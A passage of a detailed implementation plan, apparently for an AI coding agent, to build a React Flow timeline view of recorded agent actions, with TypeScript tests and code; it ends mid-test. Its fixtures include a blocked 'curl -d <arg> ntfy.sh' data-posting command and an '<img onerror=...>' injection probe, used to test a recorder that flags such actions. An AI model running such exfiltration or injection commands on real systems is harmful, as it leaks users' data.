# AG-28 Draw the Live Graph on `/v2/` Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** `/v2/` draws the live session as a timeline (steps left, files middle, hosts and rules right) of at most 20 steps, with the newest step always in view, plus `/v2/?mock=1`.

**Architecture:** Pure functions do the thinking: `mergeSteps` and `windowReducer` hold the 20-step window, `layoutGraph` turns steps into React Flow nodes and edges from list place only, and `computeViewport` places the camera. A thin React shell (`useRecorder`, `GraphView`, `App`) polls, measures the pane and draws through a fully controlled `@xyflow/react`. The API is untouched.

**Tech Stack:** Vite 8, React 19, TypeScript, Tailwind 4, `@xyflow/react` 12, vitest 5 with jsdom and `@testing-library/react`. Node 22 (`ui/.nvmrc`).

**Spec:** `docs/superpowers/specs/2026-10-02-AG-28-draw-graph-design.md` (read it first; it is the source of truth). Intent: `docs/superpowers/intents/2026-10-02-AG-28-draw-graph-intent.md`. Ticket: AG-28. If code and SPEC.md disagree, stop and ask (AGENTS.md).

## Global Constraints

Every task's requirements include these (values copied from the spec, the intent and AGENTS.md):

- Approved dependencies only: `@xyflow/react`; no `motion` yet. No physics and no layout library.
- Positions come from a step's place in the drawn list, never from its `order` (orders reach tens of thousands).
- Text is at least 16 px in a 960x1080 window. The one exception is React Flow's own attribution link (10 px, in `node_modules`), kept deliberately and stated in the PR description.
- No `dangerouslySetInnerHTML`; server text is rendered as React text only.
- OFFLINE after one failed poll: 1 s gap + 1.5 s timeout = 2.5 s worst case, limit 3 s, tested with fake timers.
- The window is 20 steps. The API (`GET /api/steps`, last 10 steps) is not changed.
- npm only inside `ui/`; commit `ui/dist`. Build `ui/dist` with Node 22 (`ui/.nvmrc`) so it is reproducible.
- AGENTS.md checks, all must pass at the end:
  - Check: `uv run ruff check . && uv run ruff format --check . && uv run pytest -q`
  - Web check: `npm --prefix ui ci && npm --prefix ui run check`
  - Stale-build check: `npm --prefix ui run build && test -z "$(git status --porcelain ui/dist)"`
- Branch is `ag-28-draw-graph`. Commit messages start `AG-28:` and end with the line `Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>`.
- Pitfall the whole plan exists to avoid: the first attempt (2026-10-01) drew a blank pane on a real session because positions came from `order`; mock mode hid it. Every position and camera test therefore uses orders from 40,000.

## Review Focus

Input classes the spec implies but a casual test list would miss. Each has a test in the task named in brackets.

1. **A newer server sends a verdict or kind this page does not know.** Expected: the step is still drawn (the kind as text, an unknown verdict as WARN), never silently dropped. [Task 2, `snapshot.test.ts`]
2. **Hostile or very long text** (a command containing `<img onerror=...>`, an 80-character argument, a long path). Expected: shown literally, cut with an ellipsis, full text in the tooltip, and the tooltip can fire. [Task 6, `GraphView.test.tsx`]
3. **The server restarts mid-session** (`{session: null, steps: []}`, or step numbers going backwards). Expected: "Waiting for agent actions…", no stale boxes, no mixed numbering. [Task 2 `window.test.ts`, Task 5 `useRecorder.test.tsx`]
4. **A short or narrow pane, and a pane resized after mount** (half of a laptop screen, devtools opened). Expected: the newest step stays visible, the rules lane stays visible, no NaN, the camera follows the resize. [Task 4 `viewport.test.ts` and `follow.test.ts`, Task 6 `GraphView.test.tsx`]
5. **`sessionStorage` blocked** (private window, blocked site data). Expected: "New session" still empties the graph until reload, nothing throws. [Task 2 `ignoredSession.test.ts`]

## File Structure

All paths are under `ui/`. Files that change together live together; each file has one job.

| File | Responsibility |
|---|---|
| `src/test-setup.ts` (new) | jsdom stubs that make React Flow measure nodes like a browser (firing `ResizeObserver`, offset sizes, `DOMMatrixReadOnly`) |
| `src/graph/types.ts` (new) | `Step`, `Snapshot` |
| `src/graph/snapshot.ts` (new) | `parseSnapshot`: untyped JSON to `Snapshot`, defensive |
| `src/graph/window.ts` (new) | `mergeSteps`, `windowReducer`: the 20-step window, session reset, "New session" |
| `src/graph/ignoredSession.ts` (new) | `sessionStorage` read/write for the hidden session, never throws |
| `src/graph/layout.ts` (new) | constants and `layoutGraph`: nodes, edges, handles; pure |
| `src/graph/viewport.ts` (new) | `computeViewport`, `resolvePane`: the camera; pure |
| `src/graph/mock.ts` (new) | `MOCK_STEPS`: the demo story from order 40,000 |
| `src/graph/useRecorder.ts` (new) | polling, OFFLINE, mock playback, "New session" |
| `src/graph/usePaneSize.ts` (new) | measures the drawing container |
| `src/graph/nodes.tsx` (new) | the four box components, with real `<Handle>`s |
| `src/graph/GraphView.tsx` (new) | controlled `<ReactFlow>` |
| `src/graph/testing.ts` (new) | `makeStep`, `stepsFrom` test builders |
| `src/App.tsx`, `src/main.tsx`, `src/index.css` (modify) | page shell, banner, button, empty state, theme colours, React Flow stylesheet |
| `src/App.test.tsx` (replace) | page-level behaviour |
| `src/textSize.test.ts` (new) | the 16 px floor |
| `vite.config.ts` (modify) | `setupFiles` |
| `ui/dist/**` | rebuilt and committed |
| `SPEC.md`, `HOOKS.md`, `README.md`, `ui/README.md` (modify) | docs match the page |

Test files sit next to the code they test. Run all commands from the repo root.

---

### Task 1: React Flow dependency and a test setup that measures like a browser

**Why first:** in a browser, React Flow measures every node and replaces the `handles` data on it with the `<Handle>` elements it finds in the DOM. A node that renders no `<Handle>` then loses its edges. A no-op `ResizeObserver` stub skips that step, so every edge test would pass for the wrong reason. This task builds the stub that does not skip it, and a guard test proving it works.

**Files:**
- Modify: `ui/package.json`, `ui/package-lock.json` (via npm)
- Modify: `ui/vite.config.ts`
- Create: `ui/src/test-setup.ts`
- Test: `ui/src/graph/measurement.test.tsx`

**Interfaces:**
- Produces: global `fireResizeObservers(): void` (tests call it after changing a mocked element size); the firing `ResizeObserver`, `DOMMatrixReadOnly` and `offsetWidth`/`offsetHeight` stubs for every later test.

- [ ] **Step 1: Commit the spec and this plan**

```bash
git add docs/superpowers/specs docs/superpowers/plans
git commit -m "$(cat <<'EOF'
AG-28: add design spec and implementation plan

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

- [ ] **Step 2: Write the guard test**

Create `ui/src/graph/measurement.test.tsx`:

```tsx
import { act, render } from '@testing-library/react'
import { Handle, Position, ReactFlow, type Edge, type Node } from '@xyflow/react'
import { describe, expect, it } from 'vitest'

// Guards the test setup itself. In a browser, React Flow measures each node and
// replaces its `handles` data with the <Handle> elements it finds in the DOM, so
// a node that renders no <Handle> loses its edges. If src/test-setup.ts ever
// regresses to a stub that never measures, the second test below fails and the
// real edge tests would otherwise pass for the wrong reason.

function Box({ data }: { data: { withHandle: boolean } }) {
  return (
    <div>
      {data.withHandle && <Handle id="r" type="source" position={Position.Right} />}
      {data.withHandle && <Handle id="l" type="target" position={Position.Left} />}
    </div>
  )
}

async function edgeCount(withHandle: boolean): Promise<number> {
  const nodes: Node[] = [
    { id: 'a', type: 'box', position: { x: 0, y: 0 }, width: 100, height: 40, data: { withHandle },
      handles: [{ id: 'r', type: 'source', position: Position.Right, x: 97, y: 17, width: 6, height: 6 }] },
    { id: 'b', type: 'box', position: { x: 300, y: 0 }, width: 100, height: 40, data: { withHandle },
      handles: [{ id: 'l', type: 'target', position: Position.Left, x: -3, y: 17, width: 6, height: 6 }] },
  ]
  const edges: Edge[] = [{ id: 'e', source: 'a', target: 'b', sourceHandle: 'r', targetHandle: 'l' }]
  const { container } = render(
    <ReactFlow nodes={nodes} edges={edges} nodeTypes={{ box: Box }} viewport={{ x: 0, y: 0, zoom: 1 }} onViewportChange={() => {}} />,
  )
  await act(async () => {
    await new Promise((resolve) => setTimeout(resolve, 50))
  })
  return container.querySelectorAll('.react-flow__edge').length
}

describe('test setup mimics browser measurement', () => {
  it('draws an edge between nodes that render handles', async () => {
    expect(await edgeCount(true)).toBe(1)
  })

  it('loses the edge when a node renders no <Handle>, as a browser would', async () => {
    expect(await edgeCount(false)).toBe(0)
  })
})
```

- [ ] **Step 3: Run it to see it fail**

Run: `npm --prefix ui test -- src/graph/measurement.test.tsx`
Expected: FAIL, either `Failed to resolve import "@xyflow/react"` (not installed) or, if the package is already in `ui/node_modules`, `ReferenceError: ResizeObserver is not defined`.

- [ ] **Step 4: Install the dependency**

Run: `npm --prefix ui install --save-exact @xyflow/react@12.12.0`
Expected: `ui/package.json` lists `"@xyflow/react": "12.12.0"` under `dependencies` (pinned on purpose: the guard test below depends on how 12.12.0 measures nodes); `ui/package-lock.json` changed.

- [ ] **Step 5: Run it again to see the setup is what is missing**

Run: `npm --prefix ui test -- src/graph/measurement.test.tsx`
Expected: both tests FAIL with `ReferenceError: ResizeObserver is not defined`.

- [ ] **Step 6: Add the setup file and register it**

Create `ui/src/test-setup.ts`:

```ts
// jsdom has no layout. These stubs make React Flow measure nodes the way a
// browser does: ResizeObserver fires after observe(), nodes report an
// offsetWidth/offsetHeight, and the handles React Flow finds in the DOM replace
// the `handles` data on the node. A no-op ResizeObserver stub would skip that
// step and hide a node that forgot to render its <Handle>.

class FiringResizeObserver {
  private readonly callback: ResizeObserverCallback
  private readonly targets = new Set<Element>()

  constructor(callback: ResizeObserverCallback) {
    this.callback = callback
    resizeObservers.add(this)
  }

  observe(target: Element): void {
    this.targets.add(target)
    // Browsers deliver observations asynchronously, after layout.
    setTimeout(() => this.fire(), 0)
  }

  unobserve(target: Element): void {
    this.targets.delete(target)
  }

  disconnect(): void {
    this.targets.clear()
    resizeObservers.delete(this)
  }

  fire(): void {
    if (this.targets.size === 0) return
    const entries = [...this.targets].map(
      (target) => ({ target, contentRect: target.getBoundingClientRect() }) as ResizeObserverEntry,
    )
    this.callback(entries, this as unknown as ResizeObserver)
  }
}

const resizeObservers = new Set<FiringResizeObserver>()

declare global {
  // eslint-disable-next-line no-var
  var fireResizeObservers: () => void
}

/** Tests call this after changing a mocked element size. */
globalThis.fireResizeObservers = () => {
  for (const observer of resizeObservers) observer.fire()
}

class FakeDOMMatrixReadOnly {
  m22: number
  constructor(transform?: string) {
    const scale = /scale\(([\d.]+)\)/.exec(transform ?? '')
    this.m22 = scale ? Number(scale[1]) : 1
  }
}

globalThis.ResizeObserver = FiringResizeObserver as unknown as typeof ResizeObserver
globalThis.DOMMatrixReadOnly = FakeDOMMatrixReadOnly as unknown as typeof DOMMatrixReadOnly

function pixels(value: string): number {
  return Number.parseFloat(value) || 0
}

Object.defineProperties(HTMLElement.prototype, {
  offsetWidth: {
    configurable: true,
    get(this: HTMLElement) {
      return pixels(this.style.width)
    },
  },
  offsetHeight: {
    configurable: true,
    get(this: HTMLElement) {
      return pixels(this.style.height)
    },
  },
})
```

In `ui/vite.config.ts`, add `setupFiles` to the existing `test` block so it reads:

```ts
  test: {
    environment: 'jsdom',
    globals: true,
    setupFiles: ['./src/test-setup.ts'],
  },
```

- [ ] **Step 7: Run the whole web check**

Run: `npm --prefix ui run check`
Expected: PASS. `measurement.test.tsx` 2 passed (1 edge with `<Handle>`s, 0 without), and the old `App.test.tsx` still passes.

- [ ] **Step 8: Commit**

```bash
git add ui/package.json ui/package-lock.json ui/vite.config.ts ui/src/test-setup.ts ui/src/graph/measurement.test.tsx
git commit -m "$(cat <<'EOF'
AG-28: add @xyflow/react and a jsdom setup that measures nodes like a browser

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 2: Step types, the 20-step window and "New session" state

**Files:**
- Create: `ui/src/graph/types.ts`, `ui/src/graph/snapshot.ts`, `ui/src/graph/window.ts`, `ui/src/graph/ignoredSession.ts`, `ui/src/graph/testing.ts`
- Test: `ui/src/graph/snapshot.test.ts`, `ui/src/graph/window.test.ts`, `ui/src/graph/ignoredSession.test.ts`

**Interfaces:**
- Produces (used by Tasks 3 to 6):
  - `type Step = { order: number; kind: StepKind; verdict: Verdict; tool: string | null; file: string | null; sensitive: boolean; command: string | null; host: string | null; rule: string | null }`; `type Snapshot = { session: string | null; steps: Step[] }`
  - `parseSnapshot(raw: unknown): Snapshot | null`
  - `WINDOW_SIZE = 20`; `mergeSteps(held: readonly Step[], incoming: readonly Step[]): Step[]`
  - `type WindowState = { session: string | null; steps: Step[]; ignored: string | null }`; `type WindowAction = { type: 'snapshot'; session: string | null; steps: Step[] } | { type: 'newSession' }`; `initialWindowState(ignored?: string | null): WindowState`; `windowReducer(state, action): WindowState`
  - `IGNORE_KEY = 'agentfly_v2_ignore_session'`; `readIgnored(): string | null`; `writeIgnored(session: string | null): void`
  - test builders `makeStep(order, over?)`, `stepsFrom(first, count, over?)`

- [ ] **Step 1: Write the test builders**

Create `ui/src/graph/testing.ts`:

```ts
import type { Step } from './types'

/** A plain allowed shell step; override fields as needed. */
export function makeStep(order: number, over: Partial<Step> = {}): Step {
  return {
    order,
    kind: 'shell',
    verdict: 'allowed',
    tool: null,
    file: null,
    sensitive: false,
    command: 'ls',
    host: null,
    rule: null,
    ...over,
  }
}

/** `count` plain steps with consecutive orders from `first`. */
export function stepsFrom(first: number, count: number, over: Partial<Step> = {}): Step[] {
  return Array.from({ length: count }, (_, i) => makeStep(first + i, over))
}
```

- [ ] **Step 2: Write the failing tests**

Create `ui/src/graph/snapshot.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { parseSnapshot } from './snapshot'

const good = {
  order: 40000,
  kind: 'shell',
  verdict: 'blocked',
  tool: null,
  file: null,
  sensitive: false,
  command: 'curl -d <arg> ntfy.sh',
  host: 'ntfy.sh',
  rule: 'R1',
}

describe('parseSnapshot', () => {
  it('reads a real body', () => {
    expect(parseSnapshot({ session: 's1', steps: [good] })).toEqual({ session: 's1', steps: [good] })
  })

  it('reads the empty state', () => {
    expect(parseSnapshot({ session: null, steps: [] })).toEqual({ session: null, steps: [] })
  })

  it('rejects a body that is not an object', () => {
    expect(parseSnapshot(null)).toBeNull()
    expect(parseSnapshot('nope')).toBeNull()
    expect(parseSnapshot(42)).toBeNull()
  })

  it('treats a missing steps array as empty, like the old page', () => {
    expect(parseSnapshot({ session: 's1' })).toEqual({ session: 's1', steps: [] })
  })

  it('fills missing optional fields with null and sensitive with false', () => {
    const { steps } = parseSnapshot({ session: 's', steps: [{ order: 1, kind: 'read', verdict: 'allowed', file: 'a' }] })!
    expect(steps[0]).toEqual({
      order: 1, kind: 'read', verdict: 'allowed', tool: null, file: 'a', sensitive: false, command: null, host: null, rule: null,
    })
  })

  it('drops malformed steps and keeps the rest', () => {
    const bad = [null, 'x', { kind: 'read', verdict: 'allowed' }, { ...good, order: 'NaN' }, { ...good, kind: 7 }, { ...good, verdict: null }]
    expect(parseSnapshot({ session: 's', steps: [...bad, good] })!.steps).toEqual([good])
  })

  it('keeps a step from a newer server: unknown kind as text, unknown verdict as warned', () => {
    const { steps } = parseSnapshot({ session: 's', steps: [{ ...good, kind: 'mcp', verdict: 'maybe' }] })!
    expect(steps).toHaveLength(1)
    expect(steps[0].kind).toBe('mcp')
    expect(steps[0].verdict).toBe('warned')
  })
})
```

Create `ui/src/graph/window.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { makeStep, stepsFrom } from './testing'
import { initialWindowState, mergeSteps, windowReducer, type WindowState } from './window'

const orders = (steps: { order: number }[]) => steps.map((s) => s.order)

describe('mergeSteps', () => {
  it('merges overlapping polls by order', () => {
    const merged = mergeSteps(stepsFrom(40000, 10), stepsFrom(40005, 10))
    expect(orders(merged)).toEqual(Array.from({ length: 15 }, (_, i) => 40000 + i))
  })

  it('keeps only the newest 20', () => {
    const merged = mergeSteps(stepsFrom(40000, 20), stepsFrom(40015, 10))
    expect(orders(merged)).toEqual(Array.from({ length: 20 }, (_, i) => 40005 + i))
  })

  it('lets incoming win for the same order', () => {
    const merged = mergeSteps([makeStep(5)], [makeStep(5, { verdict: 'blocked' })])
    expect(merged[0].verdict).toBe('blocked')
  })

  it('keeps the held steps when the poll is empty', () => {
    expect(orders(mergeSteps(stepsFrom(1, 3), []))).toEqual([1, 2, 3])
  })

  it('replaces the window when the server numbering went backwards', () => {
    expect(orders(mergeSteps(stepsFrom(40000, 10), stepsFrom(0, 3)))).toEqual([0, 1, 2])
  })

  it('does not mutate its inputs', () => {
    const held = stepsFrom(1, 3)
    mergeSteps(held, stepsFrom(2, 5))
    expect(orders(held)).toEqual([1, 2, 3])
  })
})

describe('windowReducer', () => {
  const snap = (session: string | null, steps = stepsFrom(40000, 3)) =>
    ({ type: 'snapshot', session, steps }) as const

  it('shows a session and merges later polls', () => {
    let s = windowReducer(initialWindowState(), snap('a', stepsFrom(40000, 10)))
    s = windowReducer(s, snap('a', stepsFrom(40005, 10)))
    expect(s.session).toBe('a')
    expect(orders(s.steps)).toHaveLength(15)
  })

  it('resets when the session id changes', () => {
    let s = windowReducer(initialWindowState(), snap('a', stepsFrom(40000, 3)))
    s = windowReducer(s, snap('b', stepsFrom(1, 2)))
    expect(s.session).toBe('b')
    expect(orders(s.steps)).toEqual([1, 2])
  })

  it('returns the same state object when a poll changes nothing', () => {
    const s = windowReducer(initialWindowState(), snap('a'))
    expect(windowReducer(s, snap('a'))).toBe(s)
  })

  it('clears on {session: null, steps: []} and keeps the ignored id', () => {
    let s: WindowState = windowReducer(initialWindowState(), snap('a'))
    s = windowReducer(s, { type: 'newSession' })
    s = windowReducer(s, snap(null, []))
    expect(s).toEqual({ session: null, steps: [], ignored: 'a' })
  })

  it('shows nothing for a session with no steps', () => {
    const s = windowReducer(initialWindowState(), snap('a', []))
    expect(s.session).toBeNull()
    expect(s.steps).toEqual([])
  })

  it('newSession hides the shown session and sends nothing', () => {
    const shown = windowReducer(initialWindowState(), snap('a'))
    const s = windowReducer(shown, { type: 'newSession' })
    expect(s).toEqual({ session: null, steps: [], ignored: 'a' })
  })

  it('newSession with nothing shown is a no-op and never stores null', () => {
    const s = initialWindowState()
    expect(windowReducer(s, { type: 'newSession' })).toBe(s)
  })

  it('keeps hiding the ignored session, even when a response arrives late', () => {
    let s = windowReducer(initialWindowState(), snap('a'))
    s = windowReducer(s, { type: 'newSession' })
    s = windowReducer(s, snap('a', stepsFrom(40010, 10)))
    expect(s.steps).toEqual([])
    expect(s.ignored).toBe('a')
  })

  it('a different session id clears the ignored id and shows', () => {
    let s = windowReducer(initialWindowState('a'), snap('a'))
    s = windowReducer(s, snap('b'))
    expect(s.ignored).toBeNull()
    expect(s.session).toBe('b')
    expect(s.steps).toHaveLength(3)
  })

  it('starts hidden when the ignored id was stored by an earlier load', () => {
    const s = windowReducer(initialWindowState('a'), snap('a'))
    expect(s.steps).toEqual([])
  })
})
```

Create `ui/src/graph/ignoredSession.test.ts`:

```ts
import { afterEach, describe, expect, it, vi } from 'vitest'
import { IGNORE_KEY, readIgnored, writeIgnored } from './ignoredSession'

afterEach(() => {
  vi.restoreAllMocks()
  window.sessionStorage.clear()
})

describe('ignoredSession', () => {
  it('round-trips under its own key', () => {
    writeIgnored('abc')
    expect(window.sessionStorage.getItem(IGNORE_KEY)).toBe('abc')
    expect(readIgnored()).toBe('abc')
  })

  it('does not share the old page key', () => {
    expect(IGNORE_KEY).not.toBe('fr_ignore_session')
  })

  it('removes the key for null', () => {
    writeIgnored('abc')
    writeIgnored(null)
    expect(readIgnored()).toBeNull()
  })

  it('survives blocked storage', () => {
    vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => {
      throw new Error('blocked')
    })
    vi.spyOn(Storage.prototype, 'setItem').mockImplementation(() => {
      throw new Error('blocked')
    })
    expect(readIgnored()).toBeNull()
    expect(() => writeIgnored('abc')).not.toThrow()
  })
})
```

- [ ] **Step 3: Run them to see them fail**

Run: `npm --prefix ui test -- src/graph/snapshot.test.ts src/graph/window.test.ts src/graph/ignoredSession.test.ts`
Expected: FAIL, `Failed to resolve import "./snapshot"` (and the other modules).

- [ ] **Step 4: Write the implementation**

Create `ui/src/graph/types.ts`:

```ts
export type Verdict = 'allowed' | 'blocked' | 'warned'
export type StepKind = 'read' | 'shell' | 'edit' | 'tool'

/** One cleaned step, as `GET /api/steps` returns it (recorder/memory.py). */
export interface Step {
  order: number
  kind: StepKind
  verdict: Verdict
  tool: string | null
  file: string | null
  sensitive: boolean
  command: string | null
  host: string | null
  rule: string | null
}

export interface Snapshot {
  session: string | null
  steps: Step[]
}
```

Create `ui/src/graph/snapshot.ts`:

```ts
import type { Snapshot, Step, StepKind, Verdict } from './types'

const VERDICTS: readonly string[] = ['allowed', 'blocked', 'warned']

function text(value: unknown): string | null {
  return typeof value === 'string' ? value : null
}

function parseStep(raw: unknown): Step | null {
  if (typeof raw !== 'object' || raw === null) return null
  const r = raw as Record<string, unknown>
  if (typeof r.order !== 'number' || !Number.isFinite(r.order)) return null
  if (typeof r.kind !== 'string' || typeof r.verdict !== 'string') return null
  // A newer server may send a kind or verdict this page does not know. Show the
  // step anyway (a flight recorder must not hide events): the kind as text, an
  // unknown verdict as WARN.
  return {
    order: r.order,
    kind: r.kind as StepKind,
    verdict: VERDICTS.includes(r.verdict) ? (r.verdict as Verdict) : 'warned',
    tool: text(r.tool),
    file: text(r.file),
    sensitive: r.sensitive === true,
    command: text(r.command),
    host: text(r.host),
    rule: text(r.rule),
  }
}

/**
 * Turn a parsed `/api/steps` body into a Snapshot. Returns null when the body
 * is not an object (the caller treats that as a failed poll). Steps without a
 * numeric `order`, a `kind` or a `verdict` are dropped; a missing `steps` array
 * is an empty list (as on the old page).
 */
export function parseSnapshot(raw: unknown): Snapshot | null {
  if (typeof raw !== 'object' || raw === null) return null
  const r = raw as Record<string, unknown>
  const session = typeof r.session === 'string' ? r.session : null
  const steps = Array.isArray(r.steps)
    ? r.steps.map(parseStep).filter((s): s is Step => s !== null)
    : []
  return { session, steps }
}
```

Create `ui/src/graph/window.ts`:

```ts
import type { Step } from './types'

export const WINDOW_SIZE = 20

function newestOrder(steps: readonly Step[]): number {
  return steps.reduce((max, s) => Math.max(max, s.order), -Infinity)
}

function windowOf(steps: Iterable<Step>): Step[] {
  const byOrder = new Map<number, Step>()
  for (const step of steps) byOrder.set(step.order, step)
  return [...byOrder.values()].sort((a, b) => a.order - b.order).slice(-WINDOW_SIZE)
}

/**
 * Merge a poll's steps into the held window, by `order`, keeping the newest 20.
 * If the incoming steps are older than the held ones (the server's numbering
 * went backwards, for example sessions.json was deleted), replace the window.
 */
export function mergeSteps(held: readonly Step[], incoming: readonly Step[]): Step[] {
  if (incoming.length === 0) return [...held]
  if (held.length > 0 && newestOrder(incoming) < newestOrder(held)) return windowOf(incoming)
  return windowOf([...held, ...incoming])
}

export interface WindowState {
  /** Session whose steps are held; null when nothing is shown. */
  session: string | null
  steps: Step[]
  /** Session hidden by "New session" until a different session id arrives. */
  ignored: string | null
}

export type WindowAction =
  | { type: 'snapshot'; session: string | null; steps: Step[] }
  | { type: 'newSession' }

export function initialWindowState(ignored: string | null = null): WindowState {
  return { session: null, steps: [], ignored }
}

function sameSteps(a: readonly Step[], b: readonly Step[]): boolean {
  return JSON.stringify(a) === JSON.stringify(b)
}

export function windowReducer(state: WindowState, action: WindowAction): WindowState {
  if (action.type === 'newSession') {
    if (state.session === null) return state
    return { session: null, steps: [], ignored: state.session }
  }

  const { session, steps } = action
  const ignored =
    session !== null && state.ignored !== null && session !== state.ignored ? null : state.ignored
  const hidden = session === null || session === ignored || steps.length === 0
  if (hidden) {
    if (state.session === null && state.steps.length === 0 && state.ignored === ignored) return state
    return { session: null, steps: [], ignored }
  }

  const base = state.session === session ? state.steps : []
  const merged = mergeSteps(base, steps)
  if (state.session === session && state.ignored === ignored && sameSteps(state.steps, merged)) {
    return state
  }
  return { session, steps: merged, ignored }
}
```

Create `ui/src/graph/ignoredSession.ts`:

```ts
export const IGNORE_KEY = 'agentfly_v2_ignore_session'

/** The session hidden by "New session", or null. Storage may be unavailable. */
export function readIgnored(): string | null {
  try {
    return window.sessionStorage.getItem(IGNORE_KEY)
  } catch {
    return null
  }
}

export function writeIgnored(session: string | null): void {
  try {
    if (session === null) window.sessionStorage.removeItem(IGNORE_KEY)
    else window.sessionStorage.setItem(IGNORE_KEY, session)
  } catch {
    // Storage blocked: "New session" then lasts until reload, which is fine.
  }
}
```

- [ ] **Step 5: Run the tests and the web check**

Run: `npm --prefix ui test -- src/graph/snapshot.test.ts src/graph/window.test.ts src/graph/ignoredSession.test.ts`
Expected: PASS (3 files).
Run: `npm --prefix ui run check`
Expected: PASS (type-check and all tests).

- [ ] **Step 6: Commit**

```bash
git add ui/src/graph/types.ts ui/src/graph/snapshot.ts ui/src/graph/window.ts ui/src/graph/ignoredSession.ts ui/src/graph/testing.ts ui/src/graph/snapshot.test.ts ui/src/graph/window.test.ts ui/src/graph/ignoredSession.test.ts
git commit -m "$(cat <<'EOF'
AG-28: add the 20-step window, session reducer and snapshot parser

Co-Authored-By: Claude Sonnet 5.5 <noreply@anthropic.com>
EOF
)"
```

---

### Task 3: Layout: nodes, edges and handles from list place

**Files:**
- Create: `ui/src/graph/layout.ts`, `ui/src/graph/mock.ts`
- Test: `ui/src/graph/layout.test.ts`

**Interfaces:**
- Consumes: `Step` (Task 2), `makeStep` (Task 2).
- Produces (used by Tasks 4 to 6):
  - constants `ROW_PITCH=56, STEP_W=400, STEP_H=44, FILE_W=220, HOST_W=200, LANE_H=24, GUTTER=40, SIDE_PAD=16, STEP_X=16, FILE_X=456, HOST_X=716, CONTENT_W=932, TOP_PAD=48, BOTTOM_PAD=24`
  - `type StepNode`, `FileNode`, `HostNode`, `RuleNode`, `GraphNode` (union); `interface Layout { nodes: GraphNode[]; edges: Edge[]; rowCount: number }`
  - `layoutGraph(steps: readonly Step[]): Layout`
  - `MOCK_STEPS: readonly Step[]` (5 steps, orders 40000 to 40004)
- Node ids: `step:<order>`, `file:<path>`, `host:<name>`, `rule:<id>`. Edge ids: `chain:<prevOrder>:<order>`, `file-edge:<order>`, `host-edge:<order>`, `rule-edge:<order>`. Handles: step `t` (target, top), `b` (source, bottom), `r` (source, right); every other box `l` (target, left).

- [ ] **Step 1: Write the failing tests**

Create `ui/src/graph/layout.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import {
  CONTENT_W, FILE_X, HOST_X, LANE_H, ROW_PITCH, STEP_H, STEP_X,
  layoutGraph, type GraphNode, type Layout,
} from './layout'
import { MOCK_STEPS } from './mock'
import { makeStep } from './testing'
import type { Step } from './types'

const node = (layout: Layout, id: string): GraphNode => {
  const found = layout.nodes.find((n) => n.id === id)
  if (found === undefined) throw new Error(`no node ${id}`)
  return found
}
const edge = (layout: Layout, id: string) => {
  const found = layout.edges.find((e) => e.id === id)
  if (found === undefined) throw new Error(`no edge ${id}`)
  return found
}
const has = (layout: Layout, id: string) => layout.nodes.some((n) => n.id === id)
const centre = (row: number) => row * ROW_PITCH + ROW_PITCH / 2

describe('positions come from list place, never from order', () => {
  it('puts orders from 40,000 in the first rows', () => {
    const layout = layoutGraph(MOCK_STEPS)
    const ys = layout.nodes.filter((n) => n.type === 'step').map((n) => n.position.y)
    expect(ys).toEqual([0, 1, 2, 3, 4].map((row) => centre(row) - STEP_H / 2))
    expect(Math.max(...layout.nodes.map((n) => n.position.y))).toBeLessThan(400)
  })

  it('gives the same layout for the same steps', () => {
    expect(layoutGraph(MOCK_STEPS)).toEqual(layoutGraph([...MOCK_STEPS]))
  })

  it('lays out nothing for no steps', () => {
    expect(layoutGraph([])).toEqual({ nodes: [], edges: [], rowCount: 0 })
  })

  it('uses three lanes left to right', () => {
    const layout = layoutGraph(MOCK_STEPS)
    expect(node(layout, 'step:40000').position.x).toBe(STEP_X)
    expect(node(layout, 'file:README.md').position.x).toBe(FILE_X)
    expect(node(layout, 'host:ntfy.sh').position.x).toBe(HOST_X)
    expect(node(layout, 'rule:R1').position.x).toBe(HOST_X)
    expect(CONTENT_W).toBe(932)
  })
})

describe('shared boxes', () => {
  it('draws README read twice as one box with two edges into it', () => {
    const layout = layoutGraph(MOCK_STEPS)
    expect(layout.nodes.filter((n) => n.id === 'file:README.md')).toHaveLength(1)
    const into = layout.edges.filter((e) => e.target === 'file:README.md')
    expect(into.map((e) => e.id)).toEqual(['file-edge:40000', 'file-edge:40002'])
  })

  it('puts a shared box level with the first step that touches it', () => {
    const layout = layoutGraph(MOCK_STEPS)
    expect(node(layout, 'file:README.md').position.y).toBe(centre(0) - 12)
    expect(node(layout, 'file:.env').position.y).toBe(centre(1) - 12)
  })

  it('marks a file secret when a drawn step touching it is sensitive', () => {
    const layout = layoutGraph(MOCK_STEPS)
    expect(node(layout, 'file:.env').data).toEqual({ path: '.env', sensitive: true })
    expect(node(layout, 'file:README.md').data).toEqual({ path: 'README.md', sensitive: false })
    expect(edge(layout, 'file-edge:40001').style?.stroke).toBe('var(--color-secret)')
  })

  it('keeps a host and a rule from the same step apart: rule below host', () => {
    const layout = layoutGraph(MOCK_STEPS)
    const host = node(layout, 'host:ntfy.sh').position.y
    const rule = node(layout, 'rule:R1').position.y
    expect(rule - host).toBe(28)
    expect(host).toBe(centre(4) - 26)
    expect(rule).toBe(centre(4) + 2)
  })

  it('keeps one rule box per rule id', () => {
    const steps = [
      makeStep(1, { verdict: 'blocked', rule: 'R1' }),
      makeStep(2, { verdict: 'blocked', rule: 'R1' }),
    ]
    const layout = layoutGraph(steps)
    expect(layout.nodes.filter((n) => n.type === 'rule')).toHaveLength(1)
    expect(layout.edges.filter((e) => e.target === 'rule:R1')).toHaveLength(2)
  })

  it('keeps a host named R1 apart from rule R1', () => {
    const layout = layoutGraph([makeStep(1, { host: 'R1', rule: 'R1', verdict: 'blocked' })])
    expect(has(layout, 'host:R1')).toBe(true)
    expect(has(layout, 'rule:R1')).toBe(true)
  })

  it('drops a box when no drawn step touches it', () => {
    const layout = layoutGraph(MOCK_STEPS.slice(3))
    expect(has(layout, 'file:README.md')).toBe(false)
    expect(has(layout, 'file:.env')).toBe(false)
    expect(has(layout, 'host:ntfy.sh')).toBe(true)
  })

